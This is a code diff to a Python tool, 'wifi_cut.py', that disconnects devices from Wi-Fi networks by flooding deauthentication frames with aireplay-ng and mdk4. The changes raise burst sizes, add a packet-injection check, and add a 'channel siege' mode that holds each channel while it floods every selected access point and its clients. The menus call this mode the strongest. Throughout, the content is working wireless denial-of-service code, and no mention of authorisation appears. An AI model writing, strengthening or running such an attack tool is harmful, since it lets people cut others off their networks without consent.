@@ -573,24 +573,63 @@ def deauth_burst_on_ap(
     channel: str,
     aggressive: bool,
     client_macs: Optional[List[str]] = None,
+    burst: Optional[int] = None,
 ) -> int:
     ch = normalize_channel(channel)
     if ch:
         lock_channel(mon_iface, ch)
-    burst = 64 if aggressive else 32
+    if burst is None:
+        burst = 128 if aggressive else 64
     total = 0
-    run_aireplay_deauth(mon_iface, bssid, burst)
+    code, _, err = run_aireplay_deauth(mon_iface, bssid, burst)
     total += burst
+    if code != 0 and err and "ack" in err.lower():
+        pass  # injection issues surface in --test
+    per_client = 32 if aggressive else 16
     for mac in client_macs or []:
-        run_aireplay_deauth(mon_iface, bssid, 16, mac)
-        total += 16
+        run_aireplay_deauth(mon_iface, bssid, per_client, mac)
+        total += per_client
     return total
+
+
+def test_packet_injection(mon_iface: str) -> bool:
+    print(f"{C}Testing packet injection on {mon_iface}...{RS}")
+    code, out, err = run_cmd(["aireplay-ng", "--test", mon_iface], timeout=45)
+    combined = (out + err).lower()
+    ok = "injection is working" in combined or "/30:" in combined or "30/30" in combined
+    if ok:
+        print(f"{G}  Injection OK — attacks can be sent{RS}")
+    else:
+        print(f"{R}  Injection FAILED or weak — deauth will not work reliably{RS}")
+        print(f"{Y}  Use native Kali (not VirtualBox) and AR9271 / monitor-capable adapter{RS}")
+        for line in (out + err).splitlines()[:5]:
+            if line.strip():
+                print(f"{GR}    {line.strip()}{RS}")
+    return ok
+
+
+def stop_mdk4_proc(mdk4_proc: Optional[subprocess.Popen]):
+    if mdk4_proc and mdk4_proc.poll() is None:
+        mdk4_proc.terminate()
+        try:
+            mdk4_proc.wait(timeout=3)
+        except subprocess.TimeoutExpired:
+            mdk4_proc.kill()
+
+
+def group_targets_by_channel(targets: List[Network]) -> Dict[str, List[Network]]:
+    groups: Dict[str, List[Network]] = {}
+    for t in targets:
+        ch = normalize_channel(t.channel) or "0"
+        groups.setdefault(ch, []).append(t)
+    return groups
 
 
 def start_mdk4_multi_bssids(
     mon_iface: str,
     targets: List[Network],
     channel: str,
+    rate: int = 250,
 ) -> Optional[subprocess.Popen]:
     if not tool_exists("mdk4") or not targets:
         return None
@@ -605,12 +644,84 @@ def start_mdk4_multi_bssids(
             f.write(t.bssid + "\n")
     try:
         return subprocess.Popen(
-            ["mdk4", mon_iface, "d", "-B", list_path, "-c", ch, "-s", "250"],
+            ["mdk4", mon_iface, "d", "-B", list_path, "-c", ch, "-s", str(rate)],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
         )
     except OSError:
         return None
+
+
+def channel_siege_attack(
+    mon_iface: str,
+    targets: List[Network],
+    count: int = 0,
+    hold_per_channel: float = 25.0,
+    clients_map: Optional[Dict[str, List[str]]] = None,
+):
+    """
+    Hold each channel and hammer ALL selected APs on that channel together.
+    Much more effective than fast rotation across channels.
+    """
+    if not targets:
+        print(f"{Y}No targets selected.{RS}")
+        return
+
+    display_multi_targets(targets)
+    injection_ok = test_packet_injection(mon_iface)
+
+    by_ch = group_targets_by_channel(targets)
+    channels = sorted(by_ch.keys(), key=lambda x: int(x) if x.isdigit() else 0)
+
+    print(f"\n{R}{BD}▶ Channel siege — {len(targets)} AP(s) on {len(channels)} channel(s){RS}")
+    print(f"{GR}  Holds each channel {hold_per_channel:.0f}s, mdk4 + max deauth on all APs there{RS}")
+    if count == 0:
+        print(f"{Y}  Continuous (Ctrl+C to stop){RS}")
+    if not injection_ok:
+        print(f"{Y}  Continuing anyway — expect poor results until injection works{RS}")
+
+    mdk4_proc: Optional[subprocess.Popen] = None
+    total_sent = 0
+
+    try:
+        siege_rounds = 1 if count == 0 else max(1, count // 128)
+        outer = 0
+        while outer < siege_rounds or count == 0:
+            if count != 0:
+                outer += 1
+            for ch in channels:
+                group = by_ch[ch]
+                if not lock_channel(mon_iface, ch):
+                    print(f"{Y}  Could not lock channel {ch}{RS}")
+                stop_mdk4_proc(mdk4_proc)
+                mdk4_proc = start_mdk4_multi_bssids(mon_iface, group, ch, rate=500)
+                names = ", ".join(n.display_name for n in group[:4])
+                if len(group) > 4:
+                    names += f" +{len(group) - 4}"
+                print(f"\n  {R}Siege ch{ch}: {names}{RS}")
+
+                hold_start = time.time()
+                while time.time() - hold_start < hold_per_channel:
+                    for target in group:
+                        clients = (clients_map or {}).get(target.bssid, [])
+                        total_sent += deauth_burst_on_ap(
+                            mon_iface, target.bssid, ch, True, clients, burst=128,
+                        )
+                    elapsed = int(time.time() - hold_start)
+                    print(
+                        f"\r  {R}ch{ch} {elapsed}s/{int(hold_per_channel)}s  frames≈{total_sent}{RS}",
+                        end="", flush=True,
+                    )
+                    time.sleep(0.15)
+                print()
+            if count != 0:
+                break
+    except KeyboardInterrupt:
+        print(f"\n{Y}  Siege stopped.{RS}")
+    finally:
+        stop_mdk4_proc(mdk4_proc)
+        if count != 0:
+            print(f"{G}  Siege complete (~{total_sent} frames).{RS}")
 
 
 def multi_deauth_attack(
@@ -643,12 +754,7 @@ def multi_deauth_attack(
 
     def stop_mdk4():
         nonlocal mdk4_proc
-        if mdk4_proc and mdk4_proc.poll() is None:
-            mdk4_proc.terminate()
-            try:
-                mdk4_proc.wait(timeout=3)
-            except subprocess.TimeoutExpired:
-                mdk4_proc.kill()
+        stop_mdk4_proc(mdk4_proc)
         mdk4_proc = None
 
     try:
@@ -706,24 +812,24 @@ def handle_multi_targets(
     while True:
         display_multi_targets(targets)
         print(f"{BD}Multi-target options:{RS}")
-        print(f"  1. Continuous rotation (all selected WiFi)")
-        print(f"  2. Aggressive continuous (mdk4 + flood)")
-        print(f"  3. One-shot burst on each network")
+        print(f"  1. Channel siege (RECOMMENDED — max effect on selected APs)")
+        print(f"  2. Legacy rotation (slower, less effective)")
+        print(f"  3. One-shot siege burst")
         print(f"  0. Back to scan")
 
         opt = safe_input(f"{C}Choose action: {RS}")
         if opt is None or opt == "0":
             break
         if opt == "1":
-            multi_deauth_attack(mon_iface, targets, count=0, aggressive=False)
+            channel_siege_attack(mon_iface, targets, count=0, clients_map=None)
         elif opt == "2":
             multi_deauth_attack(mon_iface, targets, count=0, aggressive=True)
         elif opt == "3":
-            count_raw = safe_input(f"{C}Frames per network (default 64): {RS}")
+            count_raw = safe_input(f"{C}Total frames budget (default 512): {RS}")
             if count_raw is None:
                 break
-            count = int(count_raw) if count_raw.isdigit() else 64
-            multi_deauth_attack(mon_iface, targets, count=count, aggressive=False)
+            count = int(count_raw) if count_raw.isdigit() else 512
+            channel_siege_attack(mon_iface, targets, count=count, hold_per_channel=15.0)
         else:
             print(f"{R}Invalid option{RS}")
 
@@ -830,7 +936,9 @@ def deauth_attack(
         else:
             print(f"{Y}  Warning: could not lock channel {ch}{RS}")
 
-    burst = 64 if aggressive else 32
+    if aggressive:
+        test_packet_injection(mon_iface)
+    burst = 128 if aggressive else 64
     mdk4_proc: Optional[subprocess.Popen] = None
 
     if aggressive:
@@ -935,7 +1043,7 @@ def interactive_mode(mon_iface: str):
             print(f"  1. Disconnect all clients (standard)")
             print(f"  2. Disconnect a specific client")
             print(f"  3. Continuous disconnect (until stopped)")
-            print(f"  4. Aggressive disconnect (mdk4 + channel lock + flood)")
+            print(f"  4. Siege mode (mdk4 + max deauth — strongest)")
             print(f"  5. Re-scan clients (30s)")
             print(f"  0. Back to scan")
 
@@ -991,9 +1099,9 @@ def interactive_mode(mon_iface: str):
                     count=0, known_clients=client_macs,
                 )
             elif opt == "4":
-                deauth_attack(
-                    mon_iface, target.bssid, channel=target.channel,
-                    count=0, aggressive=True, known_clients=client_macs,
+                channel_siege_attack(
+                    mon_iface, [target], count=0,
+                    clients_map={target.bssid: client_macs},
                 )
             else:
                 print(f"{R}Invalid option{RS}")
@@ -1078,7 +1186,8 @@ Examples:
   sudo python3 wifi_cut.py -i wlan0           # specify interface
   sudo python3 wifi_cut.py -i wlan0 --scan 30 # scan for 30 seconds
   sudo python3 wifi_cut.py -i wlan0 -b AA:BB:CC:DD:EE:FF --deauth-all
-  sudo python3 wifi_cut.py -i wlan0 --bssids AA:BB:...,11:22:... --multi-deauth --continuous
+  sudo python3 wifi_cut.py -i wlan0 --bssids AA:BB:...,11:22:... --multi-deauth --siege --continuous
+  sudo python3 wifi_cut.py -i wlan0 -b AA:BB:CC:DD:EE:FF --deauth-all --siege --continuous
   sudo python3 wifi_cut.py --check              # diagnose scan issues
         """,
     )
@@ -1087,6 +1196,11 @@ Examples:
     parser.add_argument("--scan", type=int, default=30, metavar="SEC", help="Scan duration in seconds")
     parser.add_argument("--channel", help="Lock scan/attack to channel (e.g. 6)")
     parser.add_argument("--aggressive", action="store_true", help="Use mdk4 flood + heavy deauth")
+    parser.add_argument(
+        "--siege",
+        action="store_true",
+        help="Channel siege mode (hold each channel, max deauth — most effective)",
+    )
     parser.add_argument("-b", "--bssid", help="Target AP BSSID")
     parser.add_argument(
         "--bssids",
@@ -1158,12 +1272,19 @@ Examples:
             if not targets:
                 print(f"{R}No valid targets from --bssids{RS}")
             else:
-                multi_deauth_attack(
-                    mon_iface,
-                    targets,
-                    count=0 if args.continuous else args.deauth_count,
-                    aggressive=args.aggressive or args.continuous,
-                )
+                if args.siege or args.aggressive or args.continuous:
+                    channel_siege_attack(
+                        mon_iface,
+                        targets,
+                        count=0 if args.continuous else args.deauth_count,
+                    )
+                else:
+                    multi_deauth_attack(
+                        mon_iface,
+                        targets,
+                        count=0 if args.continuous else args.deauth_count,
+                        aggressive=True,
+                    )
         elif args.bssid and (args.deauth_all or args.client or args.continuous):
             count = 0 if args.continuous else args.deauth_count
             ch = args.channel
@@ -1179,15 +1300,23 @@ Examples:
             clients = []
             if ch:
                 clients = [c.mac for c in discover_clients(mon_iface, stub, 30, nets)]
-            deauth_attack(
-                mon_iface,
-                args.bssid,
-                channel=ch,
-                client_mac=args.client,
-                count=count,
-                aggressive=args.aggressive or args.continuous,
-                known_clients=clients,
-            )
+            if args.siege or (args.aggressive and args.continuous):
+                channel_siege_attack(
+                    mon_iface,
+                    [stub],
+                    count=0 if args.continuous else args.deauth_count,
+                    clients_map={args.bssid: clients},
+                )
+            else:
+                deauth_attack(
+                    mon_iface,
+                    args.bssid,
+                    channel=ch,
+                    client_mac=args.client,
+                    count=count,
+                    aggressive=args.aggressive or args.continuous,
+                    known_clients=clients,
+                )
         elif args.bssid:
             networks = scan_networks(
                 mon_iface, args.scan, channel=args.channel,
